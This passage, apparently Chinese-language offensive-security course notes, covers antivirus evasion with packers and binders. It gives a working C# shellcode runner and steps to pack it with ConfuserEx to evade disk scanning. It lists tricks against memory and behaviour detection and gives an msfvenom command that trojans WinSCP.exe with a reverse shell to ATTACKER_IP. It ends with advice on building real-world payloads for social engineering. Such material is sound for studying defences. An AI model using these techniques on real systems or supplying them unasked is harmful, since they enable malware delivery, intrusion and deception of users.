- **规避磁盘检测**: 使用加壳器转换可执行文件后，其在磁盘上的签名会发生变化，可能不再匹配 AV 已知的恶意软件签名，从而有助于绕过基于磁盘特征的静态检测。
- **AV 检测打包程序的方式**:
    1. **解包器存根签名**: AV 厂商可能会为已知的、常被恶意软件使用的加壳器的解包存根创建签名。如果 AV 检测到某个文件包含这种已知的解包器存根，就可能将其标记为可疑或恶意，即使其内部的原始代码是未知的。
    2. **内存扫描**: 当打包的应用程序运行时，其原始代码最终会在内存中被解包出来以便执行。如果 AV 软件具备内存扫描能力，并且原始代码的内存映像匹配了其签名，那么即使文件在磁盘上是加壳的，在运行时仍然可能被检测到。

##### 4. 打包 Shellcode 运行器 (C# 示例与 ConfuserEx)

以下是一个简单的 C# Shellcode 运行器，可用于后续的加壳演示：

C#

```
using System;
using System.Runtime.InteropServices;

public class Program
{
    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    private static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

    private static UInt32 MEM_COMMIT = 0x1000;
    private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;

    public static void Main()
    {
        // 替换为实际的 Shellcode (例如由 msfvenom -f csharp 生成)
        byte[] shellcode = new byte[] { 0xfc, 0x48, 0x83, /* ... */ 0xda, 0xff, 0xd5 };

        IntPtr codeAddr = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        Marshal.Copy(shellcode, 0, codeAddr, shellcode.Length);
        IntPtr threadHandle = IntPtr.Zero;
        uint threadId = 0;
        threadHandle = CreateThread(IntPtr.Zero, 0, codeAddr, IntPtr.Zero, 0, out threadId);
        WaitForSingleObject(threadHandle, 0xFFFFFFFF);
        // Cleanup...
    }
}
```

**使用 ConfuserEx (针对 .NET 程序) 进行加壳**:

1. 编译上述 C# 代码生成可执行文件。
2. 打开 ConfuserEx。
3. 设置基本目录为桌面 (或包含可执行文件的目录)。
4. 在 "Settings" 选项卡中，添加编译好的可执行文件。
5. 为该文件添加规则 (例如，点击 "+" 创建名为 "true" 的规则)。
6. 启用压缩选项。
7. 编辑 "true" 规则，将其保护预设 (Preset) 设置为最大 (Maximum)。
8. 切换到 "Protect!" 选项卡，点击 "Protect" 按钮。

ConfuserEx 会在指定目录（通常是 `Confused` 子目录）下生成加壳后的可执行文件。这个加壳后的文件在上传到某些 AV 检测平台时，初始的磁盘扫描可能不会触发警报。

内存扫描与行为检测的挑战:

即使加壳后的文件能通过磁盘扫描，当它运行时，Windows Defender (或其他具有高级行为监控和内存扫描能力的 AV) 仍然可能检测到其恶意行为，尤其是在 Shellcode 执行敏感操作（如 CreateProcess() 创建新进程）时。

**可能的规避技巧 (针对内存扫描或行为检测)**:

- **延迟执行**: 在进程启动后等待一段时间（例如几分钟）再执行敏感操作。某些 AV 可能在进程启动初期进行密集扫描，之后降低频率。
- **使用更小、更隐蔽的 Payload**: 执行单个、影响较小的命令可能比启动一个完整的反向 Shell 更不容易被检测。例如，使用 `msfvenom -p windows/x64/exec CMD='net user ...'`。
- **迷惑性操作**: 从已建立的反向 Shell 中再次运行 `cmd.exe`。AV 可能会检测并终止原始的 Payload 进程，但新启动的 `cmd.exe` 进程可能不受影响（但这取决于 AV 的检测逻辑）。

---

#### 绑定器 (Binders)

##### 1. 定义与目的

**绑定器 (Binder)** 是一种将两个或多个可执行文件合并成一个单一可执行文件的工具。其主要目的**不是为了规避 AV 检测**，而是为了**社会工程**：将恶意载荷隐藏在一个看似合法的、用户期望运行的程序中，以欺骗用户执行。

##### 2. 工作原理

绑定器通常会将恶意 Shellcode 或可执行代码附加到合法程序上，并修改执行流程，使得在用户运行“合法”程序时，恶意代码也能被秘密执行。例如：

- 修改 PE 头中的入口点，使恶意代码在合法程序的主逻辑开始前运行，执行完毕后再将控制权交还给合法程序。
- 为恶意代码创建一个新的线程并行执行。

##### 3. 使用 msfvenom 进行绑定

`msfvenom` 的 `-x` 选项可以将一个有效载荷植入到指定的 `.exe` 模板文件中，生成的输出文件在运行时会同时执行原始程序逻辑和植入的载荷。`msfvenom` 通常通过为植入的载荷创建一个额外的线程来实现。

**示例 (将反向 Shell 植入 `WinSCP.exe`)**:

Bash

```
C:\> msfvenom -x WinSCP.exe -k -p windows/shell_reverse_tcp lhost=ATTACKER_IP lport=7779 -f exe -o WinSCP-evil.exe
```

(-k 选项尝试在单独的线程中运行载荷，以保持原始程序的功能)

当用户运行 WinSCP-evil.exe 时，WinSCP 程序会正常启动，同时一个反向 TCP Shell 会连接到攻击者的监听器。

##### 4. 绑定器与杀毒软件

- **通常无法规避签名检测**: 简单地将两个可执行文件合并，并不能改变恶意载荷本身的签名。如果原始载荷能被 AV 检测到，那么绑定后的文件通常也会被检测到。
- **主要用途**: 欺骗用户。

**最佳实践**: 在创建真实世界的恶意载荷时，通常会先使用编码器、加密器或加壳器来处理 Shellcode 或恶意程序，使其难以被基于签名的 AV 检测，然后再将其绑定到一个用户熟悉或期望的合法可执行文件中，以增加社工成功的几率。